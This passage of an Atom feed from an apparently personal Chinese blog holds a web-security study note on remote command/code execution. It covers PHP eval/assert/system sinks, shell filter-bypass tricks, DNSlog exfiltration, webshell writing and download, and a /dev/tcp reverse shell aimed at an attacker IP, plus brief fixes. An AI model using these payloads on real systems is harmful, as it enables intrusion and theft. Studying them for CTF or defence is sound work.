    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-18T05:30:30.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​RCE，Remote Command&#x2F;Code Execute，远程命令&#x2F;代码执行。</p><h1 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h1><blockquote><p>注意，通过 url 传入命令时，拼接符需要进行 url 编码。</p></blockquote><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="命令1-命令2"><a href="#命令1-命令2" class="headerlink" title="命令1 || 命令2"></a>命令1 || 命令2</h3><p>​命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。</p><h3 id="命令1-命令2-1"><a href="#命令1-命令2-1" class="headerlink" title="命令1 | 命令2"></a>命令1 | 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-2"><a href="#命令1-命令2-2" class="headerlink" title="命令1 &amp;&amp; 命令2"></a>命令1 &amp;&amp; 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-3"><a href="#命令1-命令2-3" class="headerlink" title="命令1 &amp; 命令2"></a>命令1 &amp; 命令2</h3><p>​命令 1、2 一起执行，互不影响。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="命令1-命令2-4"><a href="#命令1-命令2-4" class="headerlink" title="命令1 ; 命令2"></a>命令1 ; 命令2</h3><p>​命令 1、2 依次执行，互不影响。</p><h3 id="命令1-命令2-5"><a href="#命令1-命令2-5" class="headerlink" title="命令1 | 命令2"></a>命令1 | 命令2</h3><p>​管道符，命令 1 的执行结果做为命令 2 的输入。</p><p>​命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-6"><a href="#命令1-命令2-6" class="headerlink" title="命令1 || 命令2"></a>命令1 || 命令2</h3><p>​命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。</p><h3 id="命令1-命令2-7"><a href="#命令1-命令2-7" class="headerlink" title="命令1 &amp;&amp; 命令2"></a>命令1 &amp;&amp; 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>​把字符串按照 PHP 代码来执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>()); <span class="comment">//可以</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>();); <span class="comment">//报错</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo();&quot;</span>); <span class="comment">//可以</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo()&quot;</span>); <span class="comment">//报错</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号必须有</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>); <span class="comment">//此处及其他类似这样的变量用法，PHP会自动在变量的替代内容外包裹引号</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>​如果是字符串将会被当作 PHP 代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">phpinfo</span>()); <span class="comment">//可以</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">phpinfo</span>();); <span class="comment">//报错</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo()&quot;</span>); <span class="comment">//可以</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo();&quot;</span>); <span class="comment">//可以</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br></pre></td></tr></table></figure><p>​执行一个正则表达式的搜索和替换。</p><p>​$pattern 为正则表达式，$subject 为目标字符串，将匹配到的部分用 $replacement 替换。</p><p>​当 $pattern 处出现 <code>/e</code> 修正符，$replacement 会被当作 PHP 代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>], <span class="string">&quot;jutst test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(函数a, xxx)</span><br></pre></td></tr></table></figure><p>​调用函数 a ，xxx 为函数 a 的参数。</p><p>​经测试，只有 assert 可以，eval 不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(assert, <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="system-和-passthru"><a href="#system-和-passthru" class="headerlink" title="system() 和 passthru()"></a>system() 和 passthru()</h3><p>​执行操作系统命令，仅当执行成功时输出执行结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system/<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;命令&quot;</span>); <span class="comment">//标准写法</span></span><br><span class="line">system/<span class="title function_ invoke__">passthru</span>(命令); <span class="comment">//可以，但会抛出错误</span></span><br><span class="line">(system/passthru)(<span class="string">&quot;命令&quot;</span>); <span class="comment">//可以，但会抛出错误</span></span><br><span class="line">(system/passthru)(命令); <span class="comment">//可以，但会抛出错误</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=ver 不要在命令两边加引号，否则无法执行</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">system/<span class="title function_ invoke__">passthru</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>​执行操作系统命令，但不会输出任何内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;命令&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>​执行操作系统命令，返回执行结果，但不会输出。</p><p>​可使用 <code>echo shell_exec(&quot;命令&quot;);</code> 将执行结果输出。</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><blockquote><p>Windows 会把 echo 后的东西原封不动输出。</p><p>下面的内容仅针对 Linux 。</p></blockquote><h2 id="通用绕过方式"><a href="#通用绕过方式" class="headerlink" title="通用绕过方式"></a>通用绕过方式</h2><h3 id="加引号"><a href="#加引号" class="headerlink" title="加引号"></a>加引号</h3><p>​单、双引号均可，如 <code>who&#39;&#39;ami</code> 。</p><p>​引号内为空，系统会忽略引号。</p><h3 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h3><p>​&#x2F; 表示路径，\ 表示转义符。如果 \ 后面跟的是没有转义意义的字符，则会忽略 \ 。</p><blockquote><p>以下几种过滤情况都可以尝试通用绕过方式。</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>​可用 $IFS 替代空格。</p><p>​注意，对于 <code>echo 12$IFS34 </code> ，输出 <code>12</code> 而不是 <code>12 34</code>，因为系统会认为 $ 后面的都是变量名，而前面又没定义变量，所以不会输出任何东西，怎么办呢？</p><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>​<code>echo 12$IFS&quot;&quot;34</code> ，引号会截断变量名。</p><h3 id="局部变量法"><a href="#局部变量法" class="headerlink" title="局部变量法"></a>局部变量法</h3><p>​<code>a=34;echo 12$IFS$a</code></p><h3 id="大括号绕过"><a href="#大括号绕过" class="headerlink" title="大括号绕过"></a>大括号绕过</h3><p>​<code>echo 12$&#123;IFS&#125;34</code> ，限定变量范围。</p><h3 id="添加内置变量"><a href="#添加内置变量" class="headerlink" title="添加内置变量"></a>添加内置变量</h3><p>​<code>echo 12$IFS$134</code>，<code>$1</code>~&#96;$9<code>、</code>$@<code>、</code>$*&#96; 都是内置变量，可截断变量名。</p><h3 id="和-绕过"><a href="#和-绕过" class="headerlink" title="&lt;&gt; 和 &lt; 绕过"></a>&lt;&gt; 和 &lt; 绕过</h3><p>​&lt;&gt; 和 &lt; 可替代空格。</p><h2 id="过滤命令"><a href="#过滤命令" class="headerlink" title="过滤命令"></a>过滤命令</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 命令|<span class="built_in">base64</span>  <span class="comment">#输出命令进行base64加密后的密文</span></span><br><span class="line"><span class="built_in">echo</span> 加密后的命令|<span class="built_in">base64</span> -d|bash  <span class="comment">#先解密命令，再输出命令由bash执行的结果</span></span><br><span class="line"><span class="built_in">echo</span>$IFS<span class="variable">$1</span>加密后的命令|<span class="built_in">base64</span>$IFS<span class="variable">$1</span>-d|bash  <span class="comment">#同时过滤了空格时</span></span><br></pre></td></tr></table></figure><h4 id="hex-16进制"><a href="#hex-16进制" class="headerlink" title="hex 16进制"></a>hex 16进制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0x加密后的命令|xxd -r -p|bash <span class="comment">#先解密命令，再输出命令由bash执行的结果</span></span><br><span class="line"><span class="comment">#或 </span></span><br><span class="line"><span class="comment">#已知16进制编码下l为6c，s为73</span></span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\x6c\x73&quot;</span>) <span class="comment">#输出ls的执行结果</span></span><br></pre></td></tr></table></figure><h4 id="oct-8进制"><a href="#oct-8进制" class="headerlink" title="oct 8进制"></a>oct 8进制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#已知 (printf ls) 或 (echo ls) 为输出ls的执行结果</span></span><br><span class="line"><span class="comment">#8进制编码下l为154，s为163</span></span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>) <span class="comment">#输出ls的执行结果</span></span><br></pre></td></tr></table></figure><h3 id="局部变量绕过"><a href="#局部变量绕过" class="headerlink" title="局部变量绕过"></a>局部变量绕过</h3><p>​将命令拆分为多个变量，通过输入变量名的方式绕过。</p><p>​<code>cat flag.txt</code> ，可拆解为 <code>a=c;b=a;c=t;d=.txt;e=ag;f=fl;$a$b$c$IFS$f$e$d</code> 。</p><h3 id="内置变量绕过"><a href="#内置变量绕过" class="headerlink" title="内置变量绕过"></a>内置变量绕过</h3><p>​内置变量如上述，<code>cat flag.txt</code> 可添加为如 <code>c$1a$2t flag.txt </code> 。</p><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><h4 id="跨行"><a href="#跨行" class="headerlink" title="跨行"></a>跨行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> \</span><br><span class="line">&gt; f\</span><br><span class="line">&gt; lag\</span><br><span class="line">&gt; .txt</span><br><span class="line">flag is here!</span><br></pre></td></tr></table></figure><h4 id="单行"><a href="#单行" class="headerlink" title="单行"></a>单行</h4><p>​<code>c\a\t flag.txt</code></p><h3 id="使用绝对路径加载命令"><a href="#使用绝对路径加载命令" class="headerlink" title="使用绝对路径加载命令"></a>使用绝对路径加载命令</h3><p>​<code>/bin/cat flag.txt</code></p><h3 id="命令代替绕过"><a href="#命令代替绕过" class="headerlink" title="命令代替绕过"></a>命令代替绕过</h3><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>​more、head、tail、rev、nl、sort、uniq、od</p><p>​hexdump -b file：以 8 进制显示文件内容。</p><p>​xxd file：以 16 进制显示文件内容。</p><p>​file -f file：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file -f flag.txt</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;: cannot open <span class="string">&#x27;flag&#123;this_1s_f1@9&#125;&#x27;</span> (No such file or directory)</span><br></pre></td></tr></table></figure><p>​awk NR file：效果跟 <code>cat file</code> 一样。</p><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>​dir</p><h2 id="过滤flag关键字"><a href="#过滤flag关键字" class="headerlink" title="过滤flag关键字"></a>过滤flag关键字</h2><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>​<code>cat ????.???</code> </p><p>​<code>cat /f*</code></p><h3 id="和-绕过-1"><a href="#和-绕过-1" class="headerlink" title="[] 和 {} 绕过"></a>[] 和 {} 绕过</h3><p>​类似正则匹配，[] 匹配其内一个字符，{} 匹配其内所有字符，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> f[l,s]ag.txt <span class="comment">#或cat f[a-z]ag.txt</span></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> f&#123;l,s&#125;ag.txt</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;</span><br><span class="line"><span class="built_in">cat</span>: fsag.txt: 没有那个文件或目录</span><br></pre></td></tr></table></figure><h3 id="字符串反序绕过"><a href="#字符串反序绕过" class="headerlink" title="字符串反序绕过"></a>字符串反序绕过</h3><p>​<code>cat flag.txt</code> 的反序为 <code>txt.galf tac</code> ，配合 rev 命令使其正序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt.galf <span class="built_in">tac</span>|rev|bash</span><br></pre></td></tr></table></figure><h3 id="字符串截取绕过"><a href="#字符串截取绕过" class="headerlink" title="字符串截取绕过"></a>字符串截取绕过</h3><p>​假设 ls 的执行结果为 flag.txt ，则可构造 <code>cat $(expr substr $(ls) 1 8)</code> 。</p><h3 id="和-绕过-2"><a href="#和-绕过-2" class="headerlink" title="&#96;&#96; 和 $() 绕过"></a>&#96;&#96; 和 $() 绕过</h3><p>​如果 ls 的结果为 flag.txt，则可 cat `ls&#96; 或 cat $(ls) ，还可 ls|xargs cat 。</p><blockquote><p>xargs：进行标准输出格式转换。</p><p><code>ls|xargs cat</code>：通过管道符获取 ls 命令的标准输出，再通过 xargs 命令对标准输出格式化为 cat 命令的参数。</p></blockquote><h2 id="命令无回显"><a href="#命令无回显" class="headerlink" title="命令无回显"></a>命令无回显</h2><h3 id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p>​Linux 下结合 sleep 命令。</p><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><p>​攻击机执行 <code>nc -lvp 7777</code> 开启监听，目标机执行 <code>curl ip:7777</code> 发出 HTTP 请求，如果攻击机收到请求则说明命令有执行。</p><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><blockquote><p>域名级别：</p><p>一级域名是互联网上的最高级别的域名。它是域名中最右边的部分，例如 “.com”、”.org”、”.net” 。一级域名是由顶级域名注册机构（例如 Verisign、Public Interest Registry 等）进行管理和分配的。</p><p>二级域名是一级域名下面的一个级别。它位于一级域名的左边，是一个有独立含义的名称。例如，在 “example.com” 中，”example” 是二级域名。</p><p>三级域名是在二级域名下再划分的一个级别。它位于二级域名的左边，是更加具体的子域名。例如，在 “blog.example.com” 中，”blog” 是三级域名。</p><p>域名的层级结构可以继续扩展，例如四级域名、五级域名，以此类推。每个级别的域名都可以有自己的独立设置和管理，用于指向不同的网络资源或服务。</p></blockquote><p>​如果 HTTP 请求的目标不是 IP 地址而是域名，则需要调用域名解析服务（DNS）将域名转换为 IP 地址。</p><p>​DNSlog，域名解析服务日志。在 ping 或 curl 一个域名时，就会调用域名解析服务。请求类似 DNSlog.cn 这些带有 DNSlog 的站点里的域名时，可以在这些站点里查看 DNSlog 。 </p><h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><h4 id="DNSlog-1"><a href="#DNSlog-1" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>​如 curl `whoami&#96;.xxx.dnslog.cn 。</p><h4 id="内容迁移"><a href="#内容迁移" class="headerlink" title="内容迁移"></a>内容迁移</h4><p>​将 flag.php 的内容迁移到浏览器可直接访问的文件中。</p><ul><li><code>cp flag.php 1.txt</code> → <code>localhost/1.txt</code> </li><li><code>mv flag.php flag.txt</code> → <code>localhost/flag.txt</code></li><li><code>tar cvf flag.tar flag.php</code> → <code>localhost/flag.tar</code></li><li><code>tar zcvf flag.tar.gz flag.php</code> → <code>localhost/flag.tar.gz</code></li><li><code>zip flag.zip flag.php</code> → <code>localhost/flag.zip</code></li></ul><h3 id="直接写入-webshell"><a href="#直接写入-webshell" class="headerlink" title="直接写入 webshell"></a>直接写入 webshell</h3><p>​传入 <code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; webshell.php</code> ，然后对 webshell.php 进程操控。</p><h3 id="外部下载-webshell"><a href="#外部下载-webshell" class="headerlink" title="外部下载 webshell"></a>外部下载 webshell</h3><p>​传入 <code>wget 攻击机ip -O webshell.php </code> ，下载攻击机上的 webshell.php 到目标机上。</p><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><ol><li><p>攻击机监听端口：<code>nc -lvp 777</code> 。</p></li><li><p>目标机上执行命令：<code>bash -i &gt;&amp; /dev/tcp/攻击机ip/777 0&gt;&amp;1</code> 。接下来在目标机上执行的所有命令的结果都将被重定向到 <code>/dev/tcp/攻击机ip/777</code> 指定的攻击机上。</p><blockquote><ul><li><code>bash</code>：用于启动 Bash Shell 。</li><li><code>-i</code>：<code>bash</code> 命令的选项，表示以交互模式运行。这将使得 Shell 在连接建立后保持交互状态，可以接收输入和输出。</li><li><code>&gt;&amp;</code>：重定向符号，用于将输出重定向到某个地方。</li><li><code>/dev/tcp/攻击机ip/777</code>：这是一个特殊的文件路径，用于指定要重定向到的目标地址和端口。在这里，<code>/dev/tcp</code> 是一个虚拟文件系统，<code>攻击机ip</code> 是攻击机的 IP 地址，<code>777</code> 是要连接的目标端口号。</li><li><code>0&gt;&amp;1</code>：另一个重定向符号，表示将输入重定向到与输出相同的位置。</li></ul></blockquote></li></ol><h2 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h2><p>​异或绕过、或绕过、取反绕过、自增绕过。</p><p>​对传入参数进行上述操作后再传入。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>在执行相关函数前，对传入的变量值做好过滤，对敏感字符进行转义。</li><li>不能完全控制的危险函数最好不要使用。</li><li>进行权限控制，如文件读写权限、目录访问权限。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;​		RCE，Remote Command&amp;#x2F;Code Execute，远程命令&amp;#x2F;代码执行。&lt;/p&gt;
&lt;h1 id=&quot;命令</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/12/10/HelloWorld/"/>
    <id>http://example.com/2023/12/10/HelloWorld/</id>
    <published>2023-12-09T16:00:00.000Z</published>
    <updated>2023-12-17T04:33:36.540Z</updated>
    
    <content type="html"><![CDATA[<p>​Hello, World!</p><p>​这是我的第一篇博客，从今天开始就一起探索未知的世界吧！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		Hello, World!&lt;/p&gt;
&lt;p&gt;​		这是我的第一篇博客，从今天开始就一起探索未知的世界吧！&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
